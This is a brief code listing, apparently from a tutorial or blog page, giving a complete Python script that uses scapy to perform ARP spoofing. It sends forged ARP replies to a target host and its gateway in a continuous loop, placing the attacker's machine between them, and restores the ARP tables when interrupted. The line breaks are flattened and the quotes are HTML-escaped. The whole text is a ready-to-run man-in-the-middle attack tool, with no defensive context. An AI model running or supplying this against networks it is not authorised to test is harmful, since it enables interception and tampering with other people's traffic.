The full code:
#!/usr/bin/env python import scapy.all as scapy import time import argparse def get_arguments(): parser = argparse.ArgumentParser() parser.add_argument(&#34;-t&#34;, &#34;--target&#34;, dest=&#34;target&#34;, help=&#34;Target IP&#34;) parser.add_argument(&#34;-g&#34;, &#34;--gateway&#34;, dest=&#34;gateway&#34;, help=&#34;Gateway IP&#34;) options = parser.parse_args() return options # Get target mac address using ip address def get_mac(ip): arp_request = scapy.ARP(pdst=ip) broadcast = scapy.Ether(dst=&#34;ff:ff:ff:ff:ff:ff&#34;) arp_request_broadcast = broadcast/arp_request answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] return answered_list[0][1].hwsrc # Change mac address in arp table def spoof(target_ip, spoof_ip): target_mac = get_mac(target_ip) packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) scapy.send(packet, verbose=False) # Restore mac address in arp table def restore(dest_ip, source_ip): dest_mac = get_mac(dest_ip) source_mac = get_mac(source_ip) packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac) scapy.send(packet, count=4, verbose=False) options = get_arguments() sent_packets_count = 0 try: while True: spoof(options.target, options.gateway) spoof(options.gateway, options.target) sent_packets_count = sent_packets_count + 2 print(&#34;\r[+] ARP spoofing started - packets sent: &#34; + str(sent_packets_count)) time.sleep(2) except KeyboardInterrupt: print(&#34;\nCTRL+C pressed .... Reseting ARP tables. Please wait&#34;) restore(options.target, options.gateway) restore(options.gateway, options.target) print(&#34;\nARP table restored. Quiting&#34;)

